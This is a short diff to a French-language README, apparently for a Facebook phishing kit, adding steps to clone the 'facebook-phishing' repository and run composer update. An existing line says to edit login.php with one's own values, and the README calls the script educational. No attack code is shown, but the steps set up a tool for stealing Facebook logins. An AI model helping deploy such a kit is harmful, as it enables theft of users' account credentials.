@@ -2,6 +2,14 @@
 
 Avertissement : Script à titre éducationnnel.
 
+```
+	git clone https://github.com/informagenie/facebook-phishing
+```
+
+```
+	composer update
+```
+
 Ouvrez le fichier login.php et remplacer avec les valeurs vous concernant
 
 ```php
